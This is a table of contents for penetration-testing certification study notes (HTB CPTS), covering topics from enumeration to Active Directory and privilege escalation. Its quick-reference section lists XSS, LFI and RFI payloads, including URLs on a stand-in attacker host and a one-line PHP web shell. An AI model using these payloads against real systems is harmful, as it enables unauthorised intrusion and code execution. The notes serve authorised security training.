# Summary

## 🎯 CPTS Preparation Guide

* [📚 Introduction](README.md)

## 📋 Information Gathering

### 🌐 Infrastructure Enumeration
* [🔍 Footprinting](footprinting.md)

### 🛡️ Network Security
* [🔥 Firewall & IDS/IPS Evasion](firewall-evasion.md)

### 🎯 Assessment Methodologies
* [📊 Vulnerability Assessment](vulnerability-assessment.md)

### 🕷️ Web Application Information Gathering
* [🌐 Subdomain Enumeration & DNS Discovery](web-enumeration/subdomain-enumeration.md)
* [🔧 Web Application Enumeration](web-enumeration/web-application-enumeration.md)
* [📋 Web Information Gathering Overview](web-enumeration/web-information-gathering.md)

### 🌐 Web Application Attacks
* [🔥 Cross-Site Scripting (XSS)](xss-cross-site-scripting.md)
* [🌐 Web Attacks](web-attacks/README.md)
  * [HTTP Verb Tampering](web-attacks/http-verb-tampering.md)
  * [Insecure Direct Object References (IDOR)](web-attacks/idor-attacks.md)
  * [XML External Entity (XXE) Injection](web-attacks/xxe-injection.md)
  * [🎯 Skills Assessment](web-attacks/skills-assessment.md)
* [📁 File Inclusion](file-inclusion/README.md)
  * [Basic LFI Techniques](file-inclusion/basic-lfi-techniques.md)
  * [Advanced Bypasses & PHP Filters](file-inclusion/advanced-bypasses-filters.md)
  * [PHP Wrappers for RCE](file-inclusion/php-wrappers-rce.md)
  * [Remote File Inclusion (RFI)](file-inclusion/remote-file-inclusion.md)
  * [File Upload + LFI](file-inclusion/file-upload-lfi.md)
  * [Log Poisoning Techniques](file-inclusion/log-poisoning-techniques.md)
  * [Automated Scanning & Tools](file-inclusion/automated-scanning-tools.md)
  * [Prevention & Hardening](file-inclusion/prevention-hardening.md)
  * [Skills Assessment Walkthrough](file-inclusion/skills-assessment-walkthrough.md)
* [📤 File Upload Attacks](file-upload-attacks/README.md)
  * [Upload Exploitation](file-upload-attacks/upload-exploitation.md)
  * [Client-Side Validation](file-upload-attacks/client-side-validation.md)
  * [Blacklist Filters](file-upload-attacks/blacklist-filters.md)
  * [Basic Bypass Techniques](file-upload-attacks/basic-bypass-techniques.md)
  * [Type Filters](file-upload-attacks/type-filters.md)
  * [Limited File Uploads](file-upload-attacks/limited-file-uploads.md)
  * [Prevention & Defenses](file-upload-attacks/prevention-and-defenses.md)
  * [🎯 Skills Assessment](file-upload-attacks/skills-assessment-walkthrough.md)
* [⚡ Command Injection](command-injection/README.md)
  * [Detection Methods](command-injection/detection-methods.md)
  * [Basic Exploitation](command-injection/basic-exploitation.md)
  * [Advanced Operators](command-injection/advanced-operators.md)
  * [Filter Identification](command-injection/filter-identification.md)
  * [Bypassing Space Filters](command-injection/bypassing-space-filters.md)
  * [Bypassing Character Filters](command-injection/bypassing-character-filters.md)
  * [Bypassing Blacklisted Commands](command-injection/bypassing-blacklisted-commands.md)
  * [Advanced Command Obfuscation](command-injection/advanced-command-obfuscation.md)
  * [Evasion Tools](command-injection/evasion-tools.md)
  * [🎯 Skills Assessment](command-injection/skills-assessment-walkthrough.md)



### 🗄️ Database Services
* [🔍 MySQL Enumeration](databases/mysql-enumeration.md)
* [🏢 MSSQL Enumeration](databases/mssql-enumeration.md)
* [⚡ Oracle TNS Enumeration](databases/oracle-enumeration.md)

### 📁 Network Services
* [📂 FTP Enumeration](services/ftp-enumeration.md)
* [🔗 SMB Enumeration](services/smb-enumeration.md)
* [📁 NFS Enumeration](services/nfs-enumeration.md)
* [📧 SMTP Enumeration](services/smtp-enumeration.md)
* [📮 Email Services (IMAP/POP3)](services/email-enumeration.md)
* [📊 SNMP Enumeration](services/snmp-enumeration.md)
* [⚙️ IPMI Enumeration](services/ipmi-enumeration.md)

## ⚔️ Attacking Common Services
* [📁 FTP Attacks](attacking-common-services/ftp-attacks.md)
* [🔗 SMB Attacks](attacking-common-services/smb-attacks.md)
* [🗄️ SQL Database Attacks](attacking-common-services/sql-attacks.md)
* [🌐 DNS Attacks](attacking-common-services/dns-attacks.md)
* [🖥️ RDP Attacks](attacking-common-services/rdp-attacks.md)
* [📧 Email Services Attacks (SMTP/IMAP/POP3)](attacking-common-services/smtp-attacks.md)
* [🎯 Skills Assessment - Complete Attack Chain Scenarios](attacking-common-services/skills-assessment.md)

## 🌐 Attacking Common Applications
* [📋 Module Overview](attacking-common-applications/README.md)

### 🌐 Content Management Systems (CMS)
* [WordPress Discovery & Enumeration](attacking-common-applications/wordpress-discovery-enumeration.md)
* [WordPress Attacks & Exploitation](attacking-common-applications/wordpress-attacks.md)
* [Joomla Discovery & Enumeration](attacking-common-applications/joomla-discovery-enumeration.md)
* [Joomla Attacks & Exploitation](attacking-common-applications/joomla-attacks.md)
* [Drupal Discovery & Enumeration](attacking-common-applications/drupal-discovery-enumeration.md)
* [Drupal Attacks & Exploitation](attacking-common-applications/drupal-attacks.md)

### ⚙️ Development & Build Tools
* [Tomcat Discovery & Enumeration](attacking-common-applications/tomcat-discovery-enumeration.md)
* [Tomcat Attacks & Exploitation](attacking-common-applications/tomcat-attacks.md)
* [Jenkins Discovery & Enumeration](attacking-common-applications/jenkins-discovery-enumeration.md)
* [Jenkins Attacks & Exploitation](attacking-common-applications/jenkins-attacks.md)

### 📊 Infrastructure & Monitoring
* [Splunk Discovery & Enumeration](attacking-common-applications/splunk-discovery-enumeration.md)
* [Splunk Attacks & Exploitation](attacking-common-applications/splunk-attacks.md)
* [GitLab Discovery & Enumeration](attacking-common-applications/gitlab-discovery-enumeration.md)
* [PRTG Network Monitor Attacks](attacking-common-applications/prtg-attacks.md)

### 🎫 Customer Service & Management
* [osTicket System Exploitation](attacking-common-applications/osticket-attacks.md)

### 🔌 Web Interfaces & Gateways
* [Common Gateway Interface (CGI) - Shellshock](attacking-common-applications/cgi-shellshock-attacks.md)
* [IIS Tilde Enumeration](attacking-common-applications/iis-tilde-enumeration.md)
* [ColdFusion Discovery & Enumeration](attacking-common-applications/coldfusion-discovery-enumeration.md)

### 🔍 Specialized Applications
* [LDAP Injection Attacks](attacking-common-applications/ldap-injection-attacks.md)
* [Binary Reverse Engineering](attacking-common-applications/binary-reverse-engineering.md)
* [Other Notable Applications](attacking-common-applications/other-notable-applications.md)

## 🔀 Pivoting, Tunneling & Port Forwarding
* [📋 Module Overview](pivoting-tunneling-port-forwarding/pivoting-overview.md)
* [🔧 SSH Tunneling Complete Guide](pivoting-tunneling-port-forwarding/ssh-tunneling.md)
* [🌐 Dynamic Port Forwarding](pivoting-tunneling-port-forwarding/dynamic-port-forwarding.md)
* [🔄 Remote Port Forwarding](pivoting-tunneling-port-forwarding/remote-port-forwarding.md)
* [⚡ Chisel SOCKS5 Tunneling](pivoting-tunneling-port-forwarding/chisel-socks5-tunneling.md)
* [🛡️ SSHuttle Pivoting](pivoting-tunneling-port-forwarding/sshuttle-pivoting.md)
* [🎯 Meterpreter Tunneling](pivoting-tunneling-port-forwarding/meterpreter-tunneling.md)
* [🔗 Socat Redirection](pivoting-tunneling-port-forwarding/socat-redirection.md)
* [🪟 Plink Windows Pivoting](pivoting-tunneling-port-forwarding/plink-windows-pivoting.md)
* [⚙️ Netsh Port Forwarding](pivoting-tunneling-port-forwarding/netsh-windows-portforward.md)
* [🔌 SocksOverRDP](pivoting-tunneling-port-forwarding/socksoverrdp-windows-pivoting.md)
* [🕸️ Rpivot Web Pivoting](pivoting-tunneling-port-forwarding/rpivot-web-pivoting.md)
* [�� DNS Tunneling with dnscat2](pivoting-tunneling-port-forwarding/dnscat2-dns-tunneling.md)
* [📡 ICMP Tunneling with ptunnel-ng](pivoting-tunneling-port-forwarding/ptunnel-ng-icmp-tunneling.md)
* [�� Complete Skills Assessment](pivoting-tunneling-port-forwarding/skills-assessment-complete-walkthrough.md)

## 🏰 Active Directory Enumeration & Attacks
* [🔍 Initial Domain Enumeration](active-directory-enumeration-attacks/initial-enumeration-domain.md)
* [☣️ LLMNR/NBT-NS Poisoning from Linux](active-directory-enumeration-attacks/llmnr-nbt-ns-poisoning-linux.md)
* [🪟 LLMNR/NBT-NS Poisoning from Windows](active-directory-enumeration-attacks/llmnr-nbt-ns-poisoning-windows.md)
* [🔐 Password Policy Enumeration](active-directory-enumeration-attacks/password-policy-enumeration.md)
* [👥 Password Spraying - Target User Lists](active-directory-enumeration-attacks/password-spraying-user-list.md)
* [🐧 Password Spraying from Linux](active-directory-enumeration-attacks/password-spraying-linux.md)
* [🪟 Password Spraying from Windows](active-directory-enumeration-attacks/password-spraying-windows.md)
* [🛡️ Security Controls Enumeration](active-directory-enumeration-attacks/security-controls-enumeration.md)
* [🐧 Credentialed Enumeration from Linux](active-directory-enumeration-attacks/credentialed-enumeration-linux.md)
* [🪟 Credentialed Enumeration from Windows](active-directory-enumeration-attacks/credentialed-enumeration-windows.md)
* [🏴‍☠️ Living Off the Land](active-directory-enumeration-attacks/living-off-the-land.md)
* [🎫 Kerberoasting from Linux](active-directory-enumeration-attacks/kerberoasting-linux.md)
* [🎫 Kerberoasting from Windows](active-directory-enumeration-attacks/kerberoasting-windows.md)
* [🔑 ACL Enumeration](active-directory-enumeration-attacks/acl-enumeration.md)
* [🎯 ACL Abuse Tactics](active-directory-enumeration-attacks/acl-abuse-tactics.md)
* [💎 DCSync Attack](active-directory-enumeration-attacks/dcsync-attack.md)
* [🔐 Privileged Access](active-directory-enumeration-attacks/privileged-access.md)
* [🎭 Kerberos "Double Hop" Problem](active-directory-enumeration-attacks/kerberos-double-hop-problem.md)
* [⚡ Bleeding Edge Vulnerabilities](active-directory-enumeration-attacks/bleeding-edge-vulnerabilities.md)
* [🔧 Miscellaneous Misconfigurations](active-directory-enumeration-attacks/miscellaneous-misconfigurations.md)
* [🔗 Domain Trusts Primer](active-directory-enumeration-attacks/domain-trusts-primer.md)
* [⬆️ Child → Parent Trust Attacks](active-directory-enumeration-attacks/child-parent-trust-attacks.md)
* [🐧 Child → Parent Trust Attacks - from Linux](active-directory-enumeration-attacks/child-parent-trust-attacks-linux.md)
* [🌲 Cross-Forest Trust Abuse - from Windows](active-directory-enumeration-attacks/cross-forest-trust-abuse-windows.md)
* [🐧 Cross-Forest Trust Abuse - from Linux](active-directory-enumeration-attacks/cross-forest-trust-abuse-linux.md)
* [🎯 Skills Assessment Part I - Complete Walkthrough](active-directory-enumeration-attacks/skills-assessment-part-1.md)
* [🚀 Skills Assessment Part II - Advanced Professional Methodology](active-directory-enumeration-attacks/skills-assessment-part-2.md)

### 🖥️ Remote Management Protocols
* [📋 Remote Management Overview](remote-management/remote-management.md)
* [🐧 Linux Remote Protocols](remote-management/linux-remote-protocols.md)
* [🪟 Windows Remote Protocols](remote-management/windows-remote-protocols.md)



## 🔧 Shells & Payloads

### 🐚 Shell Fundamentals
* [📋 Shell Basics](shells-payloads/shell-basics.md)
* [🎯 Payloads](shells-payloads/payloads.md)
* [🔧 Metasploit Framework](shells-payloads/metasploit-framework.md)
* [🚀 Meterpreter Post-Exploitation](shells-payloads/meterpreter.md)

### 🐧 Platform-Specific Shells
* [🪟 Windows Shells](shells-payloads/windows-shells.md)
* [🐧 Linux/Unix Shells](shells-payloads/nix-shells.md)

### 🌐 Web Shells
* [🕷️ PHP Web Shells](shells-payloads/php-web-shells.md)
* [🔧 Web Shell Techniques](shells-payloads/web-shells.md)

### 📁 File Transfer Methods
* [🪟 Windows File Transfers](file-transfers/windows-file-transfers.md)
* [🐧 Linux File Transfers](file-transfers/linux-file-transfers.md)
* [💻 Code-Based File Transfers](file-transfers/code-file-transfers.md)
* [🔀 Miscellaneous File Transfers](file-transfers/miscellaneous-file-transfers.md)
* [🛡️ Protected File Transfers](file-transfers/protected-file-transfers.md)
* [🎯 Living off the Land Transfers](file-transfers/living-off-the-land-file-transfers.md)
* [🔍 File Transfer Detection](file-transfers/file-transfer-detection.md)

## 🪟 Windows Privilege Escalation
* [📋 Module Overview](windows-priv-esc/README.md)
* [🔍 Situational Awareness](windows-priv-esc/situational-awareness.md)
* [📊 Initial Enumeration](windows-priv-esc/initial-enumeration.md)
* [🔄 Communication with Processes](windows-priv-esc/communication-with-processes.md)
* [🥔 SeImpersonate & SeAssignPrimaryToken](windows-priv-esc/seimpersonate-privilege-escalation.md)
* [🔍 SeDebugPrivilege](windows-priv-esc/sedebug-privilege-escalation.md)
* [🏠 SeTakeOwnershipPrivilege](windows-priv-esc/setakeownership-privilege-escalation.md)
* [🏛️ Windows Built-in Groups](windows-priv-esc/windows-builtin-groups.md)
* [📋 Event Log Readers](windows-priv-esc/event-log-readers.md)
* [🌐 DnsAdmins](windows-priv-esc/dnsadmins-privilege-escalation.md)
* [💻 Hyper-V Administrators](windows-priv-esc/hyperv-administrators.md)
* [🖨️ Print Operators](windows-priv-esc/print-operators.md)
* [🖥️ Server Operators](windows-priv-esc/server-operators.md)
* [🛡️ UAC Bypass](windows-priv-esc/uac-bypass.md)
* [🔐 Weak Permissions](windows-priv-esc/weak-permissions.md)
* [💣 Kernel Exploits](windows-priv-esc/kernel-exploits.md)
* [⚡ Vulnerable Services](windows-priv-esc/vulnerable-services.md)
* [🔑 Credential Hunting](windows-priv-esc/credential-hunting.md)
* [📁 Other Files](windows-priv-esc/other-files.md)
* [🕵️ Further Credential Theft](windows-priv-esc/further-credential-theft.md)
* [🚪 Citrix Breakout](windows-priv-esc/citrix-breakout.md)
* [👥 Interacting with Users](windows-priv-esc/interacting-with-users.md)
* [🎯 Pillaging](windows-priv-esc/pillaging.md)
* [🔧 Miscellaneous Techniques](windows-priv-esc/miscellaneous-techniques.md)
* [🖥️ Windows Server 2008](windows-priv-esc/windows-server-2008.md)
* [💻 Windows 7 Exploitation](windows-priv-esc/windows-7-exploitation.md)

## 🐧 Linux Privilege Escalation
* [📋 Module Overview](linux-priv-esc/README.md)
* [🔍 Environment Enumeration](linux-priv-esc/environment-enumeration.md)
* [🔧 Services & Internals Enumeration](linux-priv-esc/services-internals-enumeration.md)
* [🔍 Credential Hunting](linux-priv-esc/credential-hunting.md)
* [🛤️ PATH Abuse](linux-priv-esc/path-abuse.md)
* [🌟 Wildcard Abuse](linux-priv-esc/wildcard-abuse.md)
* [🚪 Escaping Restricted Shells](linux-priv-esc/escaping-restricted-shells.md)
* [🔐 Special Permissions](linux-priv-esc/special-permissions.md)
* [⚡ Sudo Rights Abuse](linux-priv-esc/sudo-rights-abuse.md)
* [👑 Privileged Groups](linux-priv-esc/privileged-groups.md)
* [🎭 Capabilities](linux-priv-esc/capabilities.md)
* [⚙️ Vulnerable Services](linux-priv-esc/vulnerable-services.md)
* [⏰ Cron Job Abuse](linux-priv-esc/cron-job-abuse.md)
* [🐳 LXD Container Escape](linux-priv-esc/lxd-container-escape.md)
* [🐋 Docker Container Escape](linux-priv-esc/docker-container-escape.md)
* [📜 Logrotate Exploitation](linux-priv-esc/logrotate-exploitation.md)
* [🔧 Miscellaneous Techniques](linux-priv-esc/miscellaneous-techniques.md)
* [📚 Shared Libraries](linux-priv-esc/shared-libraries.md)
* [🎯 Shared Object Hijacking](linux-priv-esc/shared-object-hijacking.md)
* [🐍 Python Library Hijacking](linux-priv-esc/python-library-hijacking.md)
* [🚨 Sudo CVE Exploits](linux-priv-esc/sudo-cve-exploits.md)
* [🔐 Polkit/Pwnkit](linux-priv-esc/polkit-pwnkit.md)
* [💧 Dirty Pipe](linux-priv-esc/dirty-pipe.md)
* [🌐 Netfilter Kernel Exploits](linux-priv-esc/netfilter-kernel-exploits.md) *(Advanced)*
* [🛡️ Linux Hardening](linux-priv-esc/linux-hardening.md)

## 📋 Documentation & Reporting
* [📝 Notetaking & Organization](documentation-reporting/notetaking-organization.md)
* [📊 Types of Reports](documentation-reporting/types-of-reports.md)
* [📋 Components of a Report](documentation-reporting/components-of-a-report.md)
* [🔍 How to Write Up a Finding](documentation-reporting/how-to-write-up-a-finding.md)
* [🛠️ Reporting Tips and Tricks](documentation-reporting/reporting-tips-and-tricks.md)
* [📁 HTB Academy Example](documentation-reporting/HTB_Academy_EXAMPLE/README.md)
  * [📋 Administrative Information](documentation-reporting/HTB_Academy_EXAMPLE/Inlanefreight Penetration Test/Evidence/Notes/1. Administrative Information.md)
  * [🎯 Attack Path Documentation](documentation-reporting/HTB_Academy_EXAMPLE/Inlanefreight Penetration Test/Evidence/Notes/11. Attack Path.md)
  * [🔐 Credentials Tracking](documentation-reporting/HTB_Academy_EXAMPLE/Inlanefreight Penetration Test/Evidence/Notes/6. Credentials.md)
  * [📊 Findings Summary](documentation-reporting/HTB_Academy_EXAMPLE/Inlanefreight Penetration Test/Evidence/Notes/12. Findings.md)
  * [🔴 Example High Finding - Kerberoasting](documentation-reporting/HTB_Academy_EXAMPLE/Inlanefreight Penetration Test/Evidence/Findings/H1 - Kerberoasting.md)
  * [🟡 Example Medium Finding - File Shares](documentation-reporting/HTB_Academy_EXAMPLE/Inlanefreight Penetration Test/Evidence/Findings/M1 - Insecure File Shares.md)

## 🌐 Attacking Enterprise Networks
* [🔍 External Information Gathering](attacking-enterprise-networks/external-information-gathering.md)
* [⚔️ Service Enumeration & Exploitation](attacking-enterprise-networks/service-enumeration-exploitation.md)
* [🌐 Web Enumeration & Exploitation](attacking-enterprise-networks/web-enumeration-exploitation.md)
* [🚀 Initial Access](attacking-enterprise-networks/initial-access.md)
* [🔒 Post-Exploitation Persistence](attacking-enterprise-networks/post-exploitation-persistence.md)
* [🔍 Internal Information Gathering](attacking-enterprise-networks/internal-information-gathering.md)
* [⚔️ Exploitation & Privilege Escalation](attacking-enterprise-networks/exploitation-privilege-escalation.md)
* [🔄 Lateral Movement](attacking-enterprise-networks/lateral-movement.md)
* [👑 Active Directory Compromise](attacking-enterprise-networks/active-directory-compromise.md)
* [🏆 Post-Exploitation](attacking-enterprise-networks/post-exploitation.md)

## 🔐 Password Attacks

### 📋 Complete Assessment Workflows
* [🎯 Skills Assessment - Complete Password Attacks Workflow](passwords-attacks/skills-assessment-workflow.md)

### 🎯 Active Directory Attacks
* [🎫 NTDS.dit Extraction & Analysis](passwords-attacks/active-directory-ntds-attacks.md)
* [🔍 Username Enumeration & OSINT](passwords-attacks/username-enumeration.md)
* [🗡️ Dictionary & Brute Force Attacks](passwords-attacks/dictionary-attacks.md)
* [⚔️ Pass-the-Hash Techniques](passwords-attacks/pass-the-hash.md)

### 🪟 Windows Password Attacks
* [🔧 Registry Hive Attacks (SAM, SYSTEM, SECURITY)](passwords-attacks/windows-passwords.md)
* [🧠 LSASS Memory Dumping](passwords-attacks/lsass-attacks.md)
* [💾 Credential Manager Attacks](passwords-attacks/credential-manager.md)
* [🕵️ Credential Hunting in Windows](passwords-attacks/credential-hunting-windows.md)

### 🐧 Linux Password Attacks
* [🔍 Credential Hunting in Linux](passwords-attacks/credential-hunting-linux.md)

### 🔨 Hash Cracking
* [⚡ Hashcat Techniques](passwords-attacks/hashcat.md)
* [🔓 John the Ripper](passwords-attacks/john-the-ripper.md)
* [📝 Custom Wordlists & Rules](passwords-attacks/custom-wordlists-rules.md)

### 🌐 Network Service Attacks
* [🔌 Network Services Brute Force](passwords-attacks/network-services.md)
* [📁 Protected File Cracking](passwords-attacks/cracking-protected-files.md)
* [🌐 Network Traffic Credential Hunting](passwords-attacks/credential-hunting-network.md)
* [📂 Network Shares Credential Hunting](passwords-attacks/credential-hunting-shares.md)

### ⚔️ Windows Lateral Movement
* [🔑 Pass the Hash (PtH) Attacks](passwords-attacks/pass-the-hash.md)
* [🎫 Pass the Ticket (PtT) Attacks](passwords-attacks/pass-the-ticket.md)
* [📜 Pass the Certificate (ESC8 & ADCS Attacks)](passwords-attacks/pass-the-certificate.md)
* [🐧 Pass the Ticket from Linux](passwords-attacks/pass-the-ticket-linux.md)

---

## 📖 Quick Reference

### 🕷️ Web Application Information Gathering
* **DNS Tools** - dig, dnsenum, amass, puredns for subdomain discovery
* **Web Enumeration** - gobuster, ffuf, whatweb for content discovery
* **CMS Tools** - wpscan, joomscan, droopescan for specific platforms
* **Parameter Discovery** - arjun, paramspider, ffuf for hidden parameters

### 🌐 Web Application Attacks
* **XSS Types** - Stored (persistent), Reflected (non-persistent), DOM-based (client-side)
* **XSS Tools** - XSStrike, BruteXSS, Burp Suite, OWASP ZAP
* **Basic Payloads** - `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>`
* **Cookie Stealing** - `<script>alert(document.cookie)</script>`
* **LFI Techniques** - Path Traversal (`../../../etc/passwd`), PHP Wrappers (`php://filter`)
* **LFI Bypasses** - Non-recursive (`....//`), URL encoding (`%2e%2e%2f`), Approved paths (`./languages/../../../`)
* **PHP Filters** - Source code disclosure (`php://filter/read=convert.base64-encode/resource=config`)
* **PHP Fuzzing** - `ffuf -u http://target.com/FUZZ.php`, common files (`config.php`, `database.php`)
* **PHP Wrappers RCE** - Data (`data://text/plain;base64,BASE64`), Input (`php://input` + POST), Expect (`expect://id`)
* **RCE Requirements** - `allow_url_include = On` (data/input), `expect` extension (expect wrapper)
* **Remote File Inclusion (RFI)** - HTTP (`http://attacker.com/shell.php`), FTP (`ftp://attacker.com/shell.php`), SMB (`\\attacker.com\share\shell.php`)
* **RFI Servers** - Python HTTP (`python3 -m http.server 80`), FTP (`python3 -m pyftpdlib -p 21`), SMB (`impacket-smbserver`)
* **File Upload + LFI** - Malicious images (`GIF8<?php system($_GET["cmd"]); ?>`), Zip (`zip://file.jpg#shell.php`), Phar (`phar://file.jpg/shell.txt`)
* **Upload Paths** - `/uploads/`, `/profile_images/`, `/assets/images/`, path discovery via source inspection
* **Log Poisoning** - Session (`/var/lib/php/sessions/sess_ID`), Apache (`/var/log/apache2/access.log` + User-Agent), SSH (`/var/log/auth.log`)
* **Process Poisoning** - `/proc/self/environ`, `/proc/self/fd/N` via User-Agent header injection
* **Automated Scanning** - Parameter fuzzing (`ffuf` + `burp-parameter-names.txt`), LFI wordlists (`LFI-Jhaddix.txt`), Server discovery
* **LFI Tools** - `liffy`, `LFISuite`, `dotdotpwn`, `kadimus`, custom automation scripts
* **File Inclusion Module** - 9 specialized guides: Basic LFI → Advanced Bypasses → PHP Wrappers → RFI → File Upload → Log Poisoning → Automated Tools → Prevention → Skills Assessment
* **LFI Techniques** - Path traversal, PHP filters (`base64-encode`), Wrapper RCE (`data://`, `php://input`, `expect://`)
* **RFI Protocols** - HTTP, FTP, SMB remote file inclusion for direct RCE
* **Log Poisoning** - Session, Apache, SSH, Mail, FTP log contamination for RCE
* **PHP Security** - `disable_functions`, `open_basedir`, `allow_url_include=Off`, Container isolation
* **Skills Assessment** - Multi-technique chain: PHP filters → Hidden admin → LFI → Log poisoning → RCE → Flag extraction

### 🔧 Database Enumeration
* **MySQL** - Port 3306, default credentials, SQL injection
* **MSSQL** - Port 1433, Windows authentication, xp_cmdshell
* **Oracle TNS** - Port 1521, SID enumeration, privilege escalation

### 🌐 Network Service Enumeration
* **FTP** - Port 21, anonymous access, file upload/download
* **SMB** - Ports 139/445, share enumeration, EternalBlue (CVE-2017-0144)
* **NFS** - Port 2049, share mounting, UID/GID manipulation
* **SMTP** - Port 25, user enumeration, open relay testing
* **IMAP/POP3** - Ports 143/993/110/995, certificate analysis
* **SNMP** - Port 161, community strings, OID enumeration
* **IPMI** - Port 623, hash extraction, cipher zero vulnerability

### 🔐 Remote Access Protocols
* **SSH** - Port 22, key-based authentication, tunneling
* **RDP** - Port 3389, BlueKeep vulnerability, certificate analysis
* **WinRM** - Ports 5985/5986, PowerShell remoting, authentication bypass
* **WMI** - Port 135, remote queries, persistence mechanisms

---

## 🎯 HTB Academy Modules

### ✅ Completed
* Firewall and IDS/IPS Evasion
* Footprinting
* Host-Based Enumeration
* Web Application Information Gathering
* **Attacking Common Services** (Complete - 7 documents, 4,262 lines)
* **Attacking Common Applications** (Complete - 22 documents covering CMS, Development Tools, Infrastructure Monitoring, and Specialized Applications)
* **Cross-Site Scripting (XSS)** (Complete - HTB Academy guide with all XSS types and techniques)
* **File Inclusion** (Complete - HTB Academy module with 9 specialized guides: Basic LFI, Advanced Bypasses, PHP Wrappers RCE, RFI, File Upload + LFI, Log Poisoning, Automated Scanning, Prevention & Hardening, Skills Assessment)
* **File Upload Attacks** (Complete - 9 specialized guides covering all upload attack vectors and bypass techniques)
* **Command Injection** (Complete - 10 comprehensive sections with detection, exploitation, and advanced evasion techniques)
* **Web Attacks** (Complete - HTTP Verb Tampering, IDOR, XXE Injection with Skills Assessment)
* **Pivoting, Tunneling & Port Forwarding** (Complete - 14 specialized guides covering all tunneling protocols and techniques)
* **Active Directory Enumeration & Attacks** (Complete - 25 comprehensive guides covering all AD attack vectors and lateral movement)

### 🔄 In Progress
* Vulnerability Assessment
* Password Attacks

### 📅 Planned
* SQL Injection (Advanced)
* Network Enumeration
* Privilege Escalation
* Lateral Movement
* Post-Exploitation 
